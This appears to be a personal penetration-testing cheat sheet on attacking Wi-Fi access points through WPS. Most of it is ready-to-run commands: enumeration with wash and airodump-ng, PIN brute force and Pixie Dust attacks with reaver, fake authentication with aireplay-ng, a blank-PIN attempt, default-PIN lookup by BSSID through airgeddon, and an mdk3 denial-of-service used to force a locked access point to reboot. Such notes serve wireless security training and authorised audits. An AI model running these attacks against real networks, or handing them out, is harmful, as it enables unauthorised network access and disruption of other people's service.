### Introduction
---
Mostly around exploiting WPS PIN. In rare occasions physical attacks may also be viable (e.g., pushing the WPS button, checking the sticker on the back of the AP).

### Enumeration
---
After setting our adapter to monitor mode, we can use `wash` to learn about the WPS-enabled APs:
```sh
wash -i wlan0mon
```
- Listing APs with WPS enabled.
- Scans 2.4GHz by default. Add `-5` to also scan 5GHz networks.

Example output:
```
BSSID               Ch  dBm  WPS  Lck  Vendor    ESSID
--------------------------------------------------------------------------------
00:0A:D0:97:39:6F    1  -88  2.0  No   Broadcom  linksys
C8:BC:C8:FE:D9:65    2  -28  2.0  No   AtherosC  secnet
34:08:04:09:3D:38    3  -32  1.0  No   RalinkTe  wifu
```
- `WPS` indicates the WPS version. WPSv2 is more resilient towards brute force attacks.
- `Lck` indicates if WPS is locked.

Alternatively, use airodump-ng:
```sh
sudo airodump-ng --wps
```

### Exploitation
---
##### PIN Brute force (Online)
###### Reaver:
```sh
sudo reaver -i wlan0mon -b <AP bssid> -v
```

##### Pixie Dust Attack (Offline)
###### Reaver:
```sh
sudo reaver -i wlan0mon -b <AP bssid> -v -K
```
- `-K` for try running PixieWPS attack.

>[!note]
>If reaver is stuck at `Waiting for beacon from XX:XX:XX:XX:XX:XX` for a very long time, add the channel parameter `-c` to specify the channel of the AP.

If the attack is not working because we are not associated with the AP:
```sh
sudo aireplay-ng --fakeauth 30 -a <AP bssid> -h <Our wlan0mon MAC> wlan0mon
```
- When running this, run `reaver` with `-A` to avoid reaver associating with the AP.

### Null PIN Attack
---
Some WPS implementation have blank PIN. We can add `-p` for verifying a single PIN. 
```sh
sudo reaver -b <AP bssid> -i wlan0mon -v -p ''
```

### Known PINs + Generation Algorithms
---
Some default PINs depend on the first 3 bytes of the BSSID. Use the `airgeddon` project ([v1s1t0r1sh3r3/airgeddon: This is a multi-use bash script for Linux systems to audit wireless networks. (github.com)](https://github.com/v1s1t0r1sh3r3/airgeddon)).
```
sudo apt install airgeddon 
```

Loading the default PINs into memory:
```
source /usr/share/airgeddon/known_pins.db
```

Check the database with BSSID starting with, for example, `01A2B3`
```
echo ${PINDB["01A2B3"]}
```
- Try the output PINs. If all not working, try blank PIN.


### Troubleshooting
---
- Always try another Wi-Fi adapter with another chipset when possible.
- Try restarting Reaver if this message pops up: `[!] WPS transaction failed (code: 0x03), re-trying last pin`


For locked WPS, try rebooting the AP with mdk3/mdk4 ([mdk3 | Kali Linux Tools](https://www.kali.org/tools/mdk3/)), a DoS tool.
```sh
mdk3 wlan0mon a -a <AP bssid> -m
```
